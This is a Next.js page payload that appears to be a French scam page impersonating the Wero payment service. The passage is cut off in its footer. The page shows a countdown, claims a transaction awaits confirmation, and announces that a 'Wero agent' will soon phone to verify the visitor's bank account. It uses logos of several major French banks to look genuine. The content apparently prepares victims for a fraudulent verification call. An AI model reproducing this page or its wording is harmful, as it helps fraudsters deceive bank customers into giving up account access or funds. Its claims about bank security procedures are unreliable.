{"type":"app","meta":{"headers":{"x-nextjs-stale-time":"300","x-nextjs-prerender":"1","x-next-cache-tags":"_N_T_/layout,_N_T_/confirm/layout,_N_T_/confirm/page,_N_T_/confirm"},"segmentPaths":["/_tree","/_full","/confirm/__PAGE__"],"prefetchHints":{"hints":64,"slots":{"children":{"hints":96,"slots":{"children":{"hints":160,"slots":null}}}}}},"html":"<!DOCTYPE html><html lang=\"fr\" class=\"bg-white h-full\"><head><meta charSet=\"utf-8\"/><link rel=\"preconnect\" href=\"/\" crossorigin=\"\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover\"/><link rel=\"preload\" as=\"image\" href=\"/flavicon.ico\"/><link rel=\"preload\" as=\"image\" href=\"/Societe-Generale-Emblem.png\"/><link rel=\"preload\" as=\"image\" href=\"/Banquepopulaire_logo.svg.webp\"/><link rel=\"preload\" as=\"image\" href=\"/logo_BanquePostale_600x300.webp\"/><link rel=\"preload\" as=\"image\" href=\"/12895685.png\"/><link rel=\"preload\" as=\"image\" href=\"/Crédit_Agricole.svg\"/><link rel=\"preload\" as=\"image\" href=\"/unnamed.jpg\"/><link rel=\"stylesheet\" href=\"/_next/static/chunks/0ee5vkqhuma3u.css\" data-precedence=\"next\"/><link rel=\"preload\" as=\"script\" fetchPriority=\"low\" href=\"/_next/static/chunks/310vm2bl3xxpt.js\"/><script src=\"/_next/static/chunks/2mmpezlrfmbu5.js\" async=\"\"></script><script src=\"/_next/static/chunks/02fh7_m5mrih8.js\" async=\"\"></script><script src=\"/_next/static/chunks/2e_lrwr-bf1eq.js\" async=\"\"></script><script src=\"/_next/static/chunks/turbopack-3eg7-5vmdslo6.js\" async=\"\"></script><script src=\"/_next/static/chunks/3fntmmi971322.js\" async=\"\" crossorigin=\"\"></script><script src=\"/_next/static/chunks/22i43cg4l4-dq.js\" async=\"\" crossorigin=\"\"></script><script src=\"/_next/static/chunks/1u_vq54-ecab0.js\" async=\"\" crossorigin=\"\"></script><meta name=\"theme-color\" content=\"#ffffff\"/><title>Wero — Instant Sécurité</title><meta name=\"description\" content=\"Protocole de sécurité bancaire et confirmation de virement Wero.\"/><meta name=\"mobile-web-app-capable\" content=\"yes\"/><meta name=\"apple-mobile-web-app-status-bar-style\" content=\"default\"/><meta name=\"next-size-adjust\" content=\"\"/><script src=\"/_next/static/chunks/0cz1d0mv5g_q7.js\" noModule=\"\"></script></head><body class=\"bg-white text-slate-900 antialiased overscroll-none min-h-[100dvh]\"><div hidden=\"\"><!--$--><!--/$--></div><div class=\"min-h-[100dvh] w-full bg-white text-slate-900 font-sans flex flex-col justify-between overflow-x-hidden select-none\"><header class=\"w-full px-5 py-3.5 flex items-center justify-between border-b border-slate-100 bg-white sticky top-0 z-20 shrink-0\"><a class=\"flex items-center\" href=\"/\"><img src=\"/flavicon.ico\" alt=\"Wero\" class=\"h-8 w-8 object-contain\"/></a><button aria-label=\"Menu\" class=\"p-2 rounded-xl text-slate-800 hover:bg-slate-50 transition-colors focus:outline-none\"><div class=\"w-5 h-3.5 flex flex-col justify-between\"><span class=\"h-0.5 w-full bg-slate-900 rounded-full transition-all duration-300 \"></span><span class=\"h-0.5 w-full bg-slate-900 rounded-full transition-all duration-300 \"></span><span class=\"h-0.5 w-full bg-slate-900 rounded-full transition-all duration-300 \"></span></div></button></header><main class=\"flex-1 px-5 py-6 max-w-md mx-auto w-full flex flex-col items-center text-center gap-4\"><h1 class=\"text-xl font-black text-slate-900 tracking-tight uppercase\">PAIEMENT SANS PRISE DE TÊTE</h1><div class=\"w-10 h-10 rounded-full bg-emerald-100 text-[#22C55E] flex items-center justify-center shrink-0\"><svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-check w-6 h-6 stroke-[3]\"><path d=\"M20 6 9 17l-5-5\"></path></svg></div><h2 class=\"text-base font-bold text-slate-900\">Transaction en attente de confirmation</h2><p class=\"text-xs font-semibold text-slate-500\">Temps estimé avant l&#x27;appel :</p><div class=\"flex items-center justify-center gap-4 my-1\"><div class=\"flex flex-col items-center bg-slate-50 px-4 py-2.5 rounded-2xl border border-slate-100 shadow-sm min-w-[72px]\"><span class=\"text-3xl font-black text-slate-900 tracking-tight\">09</span><span class=\"text-[10px] font-bold text-slate-500 uppercase mt-0.5\">Minutes</span></div><span class=\"text-2xl font-black text-slate-300 animate-pulse\">:</span><div class=\"flex flex-col items-center bg-slate-50 px-4 py-2.5 rounded-2xl border border-slate-100 shadow-sm min-w-[72px]\"><span class=\"text-3xl font-black text-slate-900 tracking-tight\">32</span><span class=\"text-[10px] font-bold text-slate-500 uppercase mt-0.5\">Seconds</span></div></div><div class=\"my-2\"><div class=\"w-8 h-8 border-3 border-[#22C55E] border-t-transparent rounded-full animate-spin\"></div></div><div class=\"w-10 h-10 rounded-full bg-amber-100 text-amber-500 flex items-center justify-center shrink-0 mt-2\"><svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock w-5 h-5 fill-amber-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"></rect><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"></path></svg></div><p class=\"text-sm font-semibold text-slate-700 leading-snug px-2\">Pour garantir la sécurité de vos transactions, une vérification rapide et confidentielle est en cours.</p><div class=\"w-10 h-10 rounded-full bg-rose-100 text-rose-500 flex items-center justify-center shrink-0 mt-2\"><svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-phone w-5 h-5 fill-rose-500\"><path d=\"M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z\"></path></svg></div><p class=\"text-sm text-slate-700 leading-relaxed px-1\">Un agent <strong class=\"font-bold text-slate-900\">Wero</strong> vous contactera par téléphone dans les prochaines minutes (généralement sous <strong class=\"font-bold text-slate-900\">2 à 5 minutes</strong>) afin de confirmer que vous êtes bien le/la titulaire du compte bancaire associé à votre profil.</p><p class=\"text-xs text-slate-500 leading-relaxed px-1\">Cette étape ne prend que quelques instants et permet de s&#x27;assurer que vos fonds seront transférés en toute sécurité, uniquement vers un compte vérifié.</p><div class=\"w-10 h-10 rounded-full bg-emerald-100 text-[#22C55E] flex items-center justify-center shrink-0 mt-2\"><svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-check w-6 h-6 stroke-[3]\"><path d=\"M20 6 9 17l-5-5\"></path></svg></div><p class=\"text-sm font-bold text-slate-900 leading-relaxed px-1 mb-4\">Merci pour votre patience — cette mesure protège votre argent et prévient toute utilisation frauduleuse du système. Vous n&#x27;avez rien à faire, restez simplement disponible pour l&#x27;appel.</p></main><footer class=\"w-full px-5 py-5 border-t border-slate-100 bg-white text-center shrink-0\"><p class=\"text-xs font-black text-slate-900 tracking-wider uppercase mb-3.5\">NOS PARTENAIRES</p><div class=\"flex items-center justify-center gap-3.5 flex-wrap\"><img src=\"/Societe-Generale-Emblem.png\" alt=\"Société Générale\" class=\"h-5 object-contain\"/><img src=\"/Banquepopulaire_logo.svg.webp\" alt=\"Banque Populaire\" class=\"h-5 object-contain\"/><im